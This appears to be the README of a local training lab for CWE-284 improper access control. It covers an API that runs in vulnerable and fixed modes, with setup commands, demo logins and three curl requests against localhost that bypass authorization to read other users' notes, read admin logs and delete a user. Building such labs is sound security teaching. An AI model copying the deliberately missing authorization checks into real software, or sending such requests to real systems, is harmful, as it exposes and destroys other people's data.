# CWE-284 Home Lab (Improper Access Control)

This is a small intentionally vulnerable API lab for testing **CWE-284: Improper Access Control**.

The same app can run in 2 modes:
- `vuln`: intentionally broken authorization checks
- `fixed`: corrected authorization checks

## Run With Docker Compose (One Command)

From `/Users/{username}/Documents/CWE-284`:

```bash
docker compose up --build -d
```

Check status:

```bash
curl -s http://127.0.0.1:3000/health | jq
```

Stop:

```bash
docker compose down
```

Switch to fixed mode:

```bash
LAB_MODE=fixed docker compose up --build -d
```

## Local Python Setup (Optional)

```bash
cd /Users/{username}/Documents/CWE-284
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Run directly:

```bash
LAB_MODE=vuln python app.py
```

## Get Tokens

```bash
# Alice (regular user)
ALICE_TOKEN=$(curl -s -X POST http://127.0.0.1:3000/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' | jq -r '.token')

# Bob (regular user)
BOB_TOKEN=$(curl -s -X POST http://127.0.0.1:3000/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"bob","password":"bob123"}' | jq -r '.token')

# Admin
ADMIN_TOKEN=$(curl -s -X POST http://127.0.0.1:3000/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.token')
```

## Exploit CWE-284 Cases In `vuln` Mode

### Case A: Horizontal privilege bypass (object-level auth missing)
Alice reads Bob's notes:

```bash
curl -s http://127.0.0.1:3000/api/users/2/notes \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq
```

In vulnerable mode this succeeds (should be forbidden).

### Case B: Vertical privilege bypass (admin endpoint exposed)
Bob reads admin audit logs:

```bash
curl -s http://127.0.0.1:3000/api/admin/audit \
  -H "Authorization: Bearer $BOB_TOKEN" | jq
```

In vulnerable mode this succeeds (should be admin-only).

### Case C: Destructive action without authorization
Bob deletes Alice:

```bash
curl -s -X DELETE http://127.0.0.1:3000/api/users/1 \
  -H "Authorization: Bearer $BOB_TOKEN" | jq
```

In vulnerable mode this succeeds (should be admin-only).

## Validate Fixes In `fixed` Mode

Restart in fixed mode, re-login to get fresh tokens, and repeat the same requests.

Expected in `fixed` mode:
- Case A returns `403 Forbidden` for non-owner/non-admin.
- Case B returns `403 Forbidden` for non-admin.
- Case C returns `403 Forbidden` for non-admin.

Admin still has intended access.

## Endpoints

- `POST /login`
- `GET /me`
- `GET /api/users/<user_id>/notes`
- `GET /api/admin/audit`
- `DELETE /api/users/<user_id>`
- `POST /reset`

## Notes

- This lab is intentionally insecure in `vuln` mode.
- Use only in local/test environments.
